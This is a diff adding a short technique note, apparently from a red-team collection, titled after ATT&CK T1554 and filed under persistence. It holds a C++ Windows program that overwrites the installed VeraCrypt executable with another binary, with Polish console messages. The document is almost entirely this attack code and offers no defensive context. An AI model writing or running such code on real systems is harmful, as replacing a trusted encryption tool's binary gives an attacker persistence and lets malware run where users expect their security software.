@@ -1,0 +1,36 @@
+---
+title: "T1554.Compromise Client Software Binary"
+folder: "05. Persistence"
+---
+
+
+#include <windows.h>
+#include <fstream>
+#include <iostream>
+
+bool Copy1File() {
+    std::ifstream src("C:\\Users\\User\\Desktop\\KimJestem.exe", std::ios::binary);
+    std::ofstream dest("C:\\Programy\\Veracrypt\\VeraCrypt.exe", std::ios::binary);
+
+    if (!src.is_open() || !dest.is_open()) {
+        std::cerr << "Nie można otworzyć pliku do kopiowania.\n";
+        return false;
+    }
+
+    dest << src.rdbuf();
+
+    if (src.fail() || dest.fail()) {
+        std::cerr << "Błąd podczas kopiowania pliku.\n";
+        return false;
+    }
+
+    std::cout << "Plik został pomyślnie skopiowany.\n";
+    return true;
+}
+
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
+    Copy1File();
+    return 0;
+}
